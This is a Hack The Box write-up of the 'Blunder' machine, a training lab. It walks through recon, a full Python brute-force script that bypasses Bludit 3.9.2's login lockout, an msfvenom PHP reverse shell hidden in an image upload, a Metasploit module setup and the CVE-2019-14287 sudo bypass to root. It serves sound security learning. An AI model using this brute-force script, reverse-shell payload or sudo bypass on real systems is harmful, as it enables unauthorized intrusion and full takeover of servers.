---
title: HTB - Blunder Write-up
author: bigb0ss
date: 2020-10-24 23:25:00 +0800
categories: [Hack The Box, Linux, Easy]
tags: [hackthebox, blunder, Bludit CMS 3.9.2, Bruteforce Bypass, Sudo Bypass]
---

![image](/assets/img/post/htb/blunder/01_infocard.png)

This box was pretty simple and easy one to fully compromise. Good learning path to:
* BLUDIT CMS 3.9.2 Brute-force Mitigation Bypass
* BLUDIT CMS 3.9.2 Directory Traversal Exploit
* CVE-2019-14287 - Sudo Restriction Bypass 

## Recon

### Nmap

Let’s begin with an initial port scan:

```console
$ nmap -Pn --open -p- -sC -sV 10.10.10.191

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 14:25 EDT
Nmap scan report for 10.10.10.191
Host is up (0.081s latency).
Not shown: 65533 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.15 seconds
```

### Interesting Ports

* HTTP (80/TCP) - Blunder Web Page. 

![image](/assets/img/post/htb/blunder/02_http.png)


### Dirsearch

Used [dirsearch](https://github.com/maurosoria/dirsearch) to further enumerate the website.

```console
$ python3 dirsearch.py -u http://10.10.10.191/ -e txt,php,asp,js | grep 200

[15:41:45] 200 -  563B  - /.gitignore                               
[15:41:55] 200 -    3KB - /about                               
[15:42:00] 200 -    2KB - /admin/
[15:42:51] 200 -   30B  - /install.php
[15:42:54] 200 -    1KB - /LICENSE  
[15:43:13] 200 -    3KB - /README.md
[15:43:14] 200 -   22B  - /robots.txt  
```

When I visited to `/admin`, I was promoted to the following BLUDIT login page:

![image](/assets/img/post/htb/blunder/03_bludit.png)

Additionally, `/.gitignore` had a list of BLUDIT script contents. By searching, I was able to identify the version of the BLUDIT CMS in `http://10.10.10.191/bl-plugins/version/metadata.json`

![image](/assets/img/post/htb/blunder/04_version.png)

### FFUF

I also ran another web discovery tool [FFUF](https://github.com/ffuf/ffuf) just in case I missed anything. I found another `.txt` file called `todo.txt` which contained the potential username `fergus`.

```console
$ ./ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .txt -u http://10.10.10.191/FUZZ -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v0.12
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.191/FUZZ
 :: Extensions       : .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

LICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]
about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
cgi-bin/                [Status: 301, Size: 0, Words: 1, Lines: 1]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]
```

![image](/assets/img/post/htb/blunder/05_user.png)

## Initial Foothold

### Password Bruteforcing

By Google searching, I found a potential [BLUDIT CMS 3.9.2 exploit](https://www.exploit-db.com/exploits/48701). But it required valid login credentials to the `/admin` page. 

Further searching found another exploit to bypass the brute-force lock-out mitigation for the BLUDIT CMS 3.9.2 - [Bludit Brute Force Mitigation Bypass](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)

The vulnerability was simply that one of the functions `getUserIp` within the `lb-kernel/security.class.php` script did not validate the source IP of the login attempt; therefore, an attacker can spoof the source IP with any arbitrary value to bypass the brute-force mitigation. 

```php
public function getUserIp()
{
  if (getenv('HTTP_X_FORWARDED_FOR')) {
    $ip = getenv('HTTP_X_FORWARDED_FOR');
  } elseif (getenv('HTTP_CLIENT_IP')) {
    $ip = getenv('HTTP_CLIENT_IP');
  } else {
    $ip = getenv('REMOTE_ADDR');
  }
  return $ip;
}
```

In order to perform the password brute-forcing, I `cewl` the web page to create the potential wordlist. 

```console
# cewl http://10.10.10.191 > tmp && cewl http://10.10.10.191/about >> tmp && sort -u tmp > passList.txt
```

I modified the provided POC script in order to supply the password file. Using this script, I was ablt to obtain the password for the user `fergus`.

```python
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []

with open('passList.txt') as fp:
    line = fp.read().splitlines()
   
    for password in line:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

        print('[INFO] Trying: {p}'.format(p = password))

        headers = {
            'X-Forwarded-For': password,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': login_url
        }

        data = {
            'tokenCSRF': csrf_token,
            'username': username,
            'password': password,
            'save': ''
        }

        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print()
                print('[INFO] SUCCESS: Password found!')
                print('[INFO] Use {u}:{p} to login.'.format(u = username, p = password))
                print()
                break
```

![image](/assets/img/post/htb/blunder/06_bludit-pass.png)

### Bludit 3.9.2 - Directory Traversal Image Upload

Using the [POC script](https://www.exploit-db.com/exploits/48701), I obtained the reverse shell from the target box.

First, create the `evil.png` with a reverse shell and a `.htacess` file.

```console
### Creating evil.png
$ msfvenom -p php/reverse_php LHOST=10.10.14.15 LPORT=443 -f raw -b '"' > evil.png
$ echo -e "<?php $(cat evil.png)" > evil.png

### Creating .htaccess
$ echo "RewriteEngine off" > .htaccess
$ echo "AddType application/x-httpd-php .png" >> .htaccess
```
Then, update the `poc.py` script with our URL and login credentials.

```python
...snip...

url = 'http://10.10.10.191'  # CHANGE ME
username = 'fergus'          # CHANGE ME
password = 'RolandDeschain'  # CHANGE ME

...snip...
```

While running the listener `nc -lvnp 443`, execute the `poc.py` script and visit the upload image page at `http://10.10.10.191/bl-content/tmp/temp/evil.png`.

```consols
$ python3 poc.py 
cookie: 335s5kf5clu2j8pe3oe23k93k1
csrf_token: ef167ea5717fc72c4359195bd051aaf3495918ae
Uploading payload: evil.png
Uploading payload: .htaccess
```

![image](/assets/img/post/htb/blunder/07_rev-shell.png)


## Privilege Escalation

### www-data --> hugo (user.txt)

From the enumeration, another BLUDIT CMS `bludit-3.10.0a` build was found. Within, I found a PHP script called `users.php` which contained SHA-1 hashed password for the `hugo` user.

![image](/assets/img/post/htb/blunder/08_hugo-hash.png)

```
# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: faca404fd5c0a31cf1897b823c695c85cffeb98d

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

And using an online SHA-1 decryptor, the cleartext password for the `hugo` user was obtained. (Password: Password120)

![image](/assets/img/post/htb/blunder/09_hugo-pass.png)

> **NOTE**: The reverse shell `php/reverse-php` created with the POC script was not allowing for me to spawn a TTY shell such as `python -c 'import pty;pty.spawn("/bin/bash")'`. There was a Metasploit module for this exploit, so moving forward I will be using that instead of the POC script.

Metasploit Setup:
```console
msf5 exploit(linux/http/bludit_upload_images_exec) > options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS  RolandDeschain   yes       The password for Bludit
   BLUDITUSER  fergus           yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2
```

Getting a TTY Shell:

![image](/assets/img/post/htb/blunder/10_tty.png)

And successfully reading the `user.txt` file.

```console
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ su -l hugo
su -l hugo
Password: Password120

hugo@blunder:~$ ls
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
hugo@blunder:~$ cat user.txt
cat user.txt
18941d126772300c8ea22297f4cd66e6
```

### hugo --> root (CVE-2019-14287)

By quickly checking what `sudo` privilege the `hugo` user had, it appeared that the `hugo` user could run the `/bin/bash` command as any users but `root`. 

```console
hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

It turned out to be there is a public vulnerability ([CVE-2019-14287](https://access.redhat.com/security/cve/cve-2019-14287)) which can be used to take adventage of this particular `sudoer` configuration. 

In Linux, users can be also called by numbers, such as `root` = `#0`. However, in this case, `sudo -u#0 /bin/bash` was still restricted, but using `sudo -u#-1 /bin/bash`, the restriction was successfully bypassed to gain `root` access. 

```console
sudo -u#0 /bin/bash
Password: Password120

Sorry, user hugo is not allowed to execute '/bin/bash' as root on blunder.

hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
Password: Password120

root@blunder:/home/hugo# id    
id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
r
oot@blunder:/home/hugo# cat /root/root.txt
cat /root/root.txt
f278317a8593bd7363e8de5b8b29d6a0
```

Thanks for reading! :)
